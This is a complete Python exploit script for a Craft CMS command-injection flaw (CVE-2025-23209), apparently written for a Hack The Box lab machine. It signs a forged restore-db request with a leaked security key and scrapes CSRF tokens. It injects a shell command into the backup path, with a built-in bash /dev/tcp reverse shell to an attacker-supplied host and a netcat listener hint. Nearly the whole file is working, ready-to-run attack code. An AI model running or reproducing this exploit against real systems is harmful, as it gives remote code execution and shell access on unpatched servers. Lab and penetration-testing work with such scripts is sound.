#!/usr/bin/env python3
"""
CVE-2025-23209: Craft CMS RCE via Command Injection in Database Restore
Author: CareSync HTB Machine Project
Date: 2025-01-15

VULNERABILITY SUMMARY:
- Craft CMS versions <4.13.8 and <5.5.8 are vulnerable to RCE
- Requires compromised CRAFT_SECURITY_KEY
- Exploits path traversal + command injection in actionRestoreDb()
- Vulnerable code: restore command uses unsanitized {file} token

EXPLOITATION:
1. Obtain CRAFT_SECURITY_KEY from leaked backup/config
2. Craft malicious dbBackupPath with command injection
3. Sign payload using Yii2's Security::hashData() format
4. POST to /admin/actions/updater/restore-db
5. Command executes as PHP-FPM user (medapp)


"""

import argparse
import base64
import hashlib
import hmac
import json
import re
import sys
from typing import Optional, Tuple

import requests


class CraftExploit:
    def __init__(self, base_url: str, security_key: str):
        self.base_url = base_url.rstrip('/')
        self.security_key = security_key
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
        })

    def _fetch_csrf(self) -> Tuple[Optional[str], Optional[str], Optional[str]]:
        """
        Attempt to bootstrap CSRF/session context from common CP pages.
        Returns: (param_name, token_value, source_url)
        """
        csrf_name = None
        csrf_value = None
        source_url = None

        candidates = [
            f"{self.base_url}/admin/login",
            f"{self.base_url}/admin",
            f"{self.base_url}/index.php/admin/login",
            f"{self.base_url}/index.php/admin",
        ]

        input_re = re.compile(
            r'<input[^>]+name="([^"]*CSRF[^"]*)"[^>]+value="([^"]+)"',
            flags=re.IGNORECASE,
        )

        for url in candidates:
            try:
                resp = self.session.get(url, timeout=10, allow_redirects=True)
            except requests.RequestException:
                continue

            source_url = resp.url
            match = input_re.search(resp.text or "")
            if match:
                csrf_name = match.group(1)
                csrf_value = match.group(2)
                return csrf_name, csrf_value, source_url

            # Fallback: try CSRF cookie directly.
            for cookie_name, cookie_value in self.session.cookies.get_dict().items():
                if "csrf" in cookie_name.lower():
                    csrf_name = cookie_name
                    csrf_value = cookie_value
                    return csrf_name, csrf_value, source_url

        return None, None, source_url

    def _hmac_digest(self, data: str) -> bytes:
        return hmac.new(
            self.security_key.encode('utf-8'),
            data.encode('utf-8'),
            hashlib.sha256,
        ).digest()

    def hash_data(self, data: str, mode: str = "hex") -> str:
        """
        Build signed `data` value used by Craft updater endpoints.

        Modes:
        - hex:      hex(HMAC) + JSON
        - raw_b64:  base64(raw HMAC) + JSON
        - blob_b64: base64(raw HMAC + JSON)
        """
        mac_raw = self._hmac_digest(data)

        if mode == "hex":
            return mac_raw.hex() + data
        if mode == "raw_b64":
            return base64.b64encode(mac_raw).decode("ascii") + data
        if mode == "blob_b64":
            blob = mac_raw + data.encode("utf-8")
            return base64.b64encode(blob).decode("ascii")

        raise ValueError(f"Unsupported signature mode: {mode}")

    def create_payload(self, db_backup_path: str) -> dict:
        """
        Create the exploit payload that will be sent to restore-db endpoint.

        The dbBackupPath is injected into shell command:
        mysql --defaults-file=/tmp/xxx {database} < "{file}"

        Payload format: "; our_command #
        Result: mysql ... < ""; our_command #"
        """
        payload_data = {
            'dbBackupPath': db_backup_path
        }
        return payload_data

    @staticmethod
    def _extract_error_hint(text: str) -> str:
        # Capture common Craft error title/body snippets for better debugging.
        patterns = [
            r"<title>(.*?)</title>",
            r"<h1>(.*?)</h1>",
            r"Unable to verify your data submission\.",
            r"Request contained an invalid body param",
            r"Invalid backup path:[^<\n]+",
        ]
        for pattern in patterns:
            match = re.search(pattern, text, flags=re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1).strip() if match.groups() else match.group(0).strip()
        return text[:200].strip()

    def _build_endpoints(self) -> list[str]:
        # Try a few route shapes seen in Craft deployments/rewrite setups.
        return [
            f"{self.base_url}/admin/actions/updater/restore-db",
            f"{self.base_url}/index.php/admin/actions/updater/restore-db",
            f"{self.base_url}/index.php?p=admin/actions/updater/restore-db",
        ]

    def exploit(
        self,
        command: str,
        lhost: str = None,
        lport: int = None,
        signature_mode: str = "auto",
    ) -> bool:
        """
        Execute the exploit.

        Args:
            command: Shell command to execute (e.g., reverse shell)
            lhost: Listener host for reverse shell (optional)
            lport: Listener port for reverse shell (optional)

        Returns:
            True if exploit succeeded, False otherwise
        """
        print(f"[*] Target: {self.base_url}")
        print(f"[*] Security Key: {self.security_key}")

        # Build command injection payload
        # MySQL restore command format: mysql ... < "{file}"
        # We inject: "; <our_command> #
        # Result: mysql ... < ""; <our_command> #"

        if lhost and lport:
            # Reverse shell payload
            shell_cmd = f'bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"'
        else:
            # Custom command
            shell_cmd = command

        # Craft the injection payload
        injection = f'"; {shell_cmd} #'

        print(f"[*] Injection payload: {injection}")

        csrf_name = None
        csrf_token = None
        csrf_source = None
        csrf_name, csrf_token, csrf_source = self._fetch_csrf()
        if csrf_name and csrf_token:
            print(f"[*] CSRF token discovered ({csrf_name}) from: {csrf_source}")
        else:
            print("[!] CSRF token auto-discovery failed; continuing without CSRF fields")

        # Create data payload
        payload_data = self.create_payload(injection)

        # Serialize and sign payload candidates
        payload_json = json.dumps(payload_data, separators=(',', ':'))

        if signature_mode == "auto":
            modes = ["hex", "raw_b64", "blob_b64"]
        else:
            modes = [signature_mode]

        endpoints = self._build_endpoints()

        for mode in modes:
            signed_payload = self.hash_data(payload_json, mode=mode)
            print(f"[*] Trying signature mode: {mode}")
            print(f"[*] Payload size: {len(signed_payload)} bytes")

            for endpoint in endpoints:
                print(f"[*] Sending exploit to: {endpoint}")
                try:
                    post_data = {'data': signed_payload}
                    headers = {}
                    if csrf_name and csrf_token:
                        post_data[csrf_name] = csrf_token
                        headers["X-CSRF-Token"] = csrf_token
                        if csrf_source:
                            headers["Referer"] = csrf_source

                    response = self.session.post(
                        endpoint,
                        data=post_data,
                        headers=headers,
                        timeout=10,
                        allow_redirects=False
                    )
                except requests.exceptions.Timeout:
                    print("[+] Request timed out - command may be executing!")
                    print("[+] Check your listener")
                    return True
                except requests.exceptions.ConnectionError as e:
                    print(f"[!] Connection error: {e}")
                    return False
                except Exception as e:
                    print(f"[!] Error: {e}")
                    return False

                print(f"[*] Response status: {response.status_code}")

                if response.status_code == 200:
                    print("[+] Exploit sent successfully!")
                    print("[+] Check your listener for incoming shell")
                    return True

                if response.status_code == 302:
                    loc = response.headers.get("Location", "")
                    print(f"[!] Redirected ({loc}) - likely auth/session requirement")
                    continue

                if response.status_code == 400:
                    hint = self._extract_error_hint(response.text or "")
                    print(f"[!] 400 hint: {hint}")

                    # If this appears to be path validation, signature likely worked.
                    if "invalid backup path" in hint.lower():
                        print("[!] Signature appears valid, but target rejects dbBackupPath.")
                        print("[!] This usually means patched version or strict backup-path checks.")
                        return False
                    continue

                print(f"[!] Unexpected status code: {response.status_code}")
                print(f"[!] Response preview: {response.text[:500]}")

        print("[!] All signature/route attempts failed.")
        return False


def main():
    parser = argparse.ArgumentParser(
        description='CVE-2025-23209: Craft CMS RCE Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )

    parser.add_argument(
        '--url',
        required=True,
        help='Target Craft CMS URL (e.g., http://caresync.htb)'
    )

    parser.add_argument(
        '--security-key',
        required=True,
        help='Leaked CRAFT_SECURITY_KEY value'
    )

    parser.add_argument(
        '--command',
        help='Custom shell command to execute'
    )

    parser.add_argument(
        '--lhost',
        help='Attacker IP for reverse shell'
    )

    parser.add_argument(
        '--lport',
        type=int,
        default=4444,
        help='Attacker port for reverse shell (default: 4444)'
    )

    parser.add_argument(
        '--signature-mode',
        choices=['auto', 'hex', 'raw_b64', 'blob_b64'],
        default='auto',
        help='Signing mode for data payload (default: auto)'
    )

    args = parser.parse_args()

    # Validate arguments
    if not args.command and not args.lhost:
        parser.error('Either --command or --lhost must be specified')

    # Banner
    print("=" * 60)
    print("CVE-2025-23209: Craft CMS RCE Exploit")
    print("CareSync HTB Machine - Educational Use Only")
    print("=" * 60)
    print()

    # Create exploit instance
    exploit = CraftExploit(args.url, args.security_key)

    # Execute exploit
    if args.command:
        success = exploit.exploit(
            command=args.command,
            signature_mode=args.signature_mode,
        )
    else:
        print(f"[*] Setting up reverse shell to {args.lhost}:{args.lport}")
        print(f"[!] Make sure you have a listener running:")
        print(f"    nc -lvnp {args.lport}")
        print()
        success = exploit.exploit(
            command=None,
            lhost=args.lhost,
            lport=args.lport,
            signature_mode=args.signature_mode,
        )

    if success:
        print()
        print("[+] Exploitation completed!")
        sys.exit(0)
    else:
        print()
        print("[!] Exploitation failed")
        sys.exit(1)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(130)
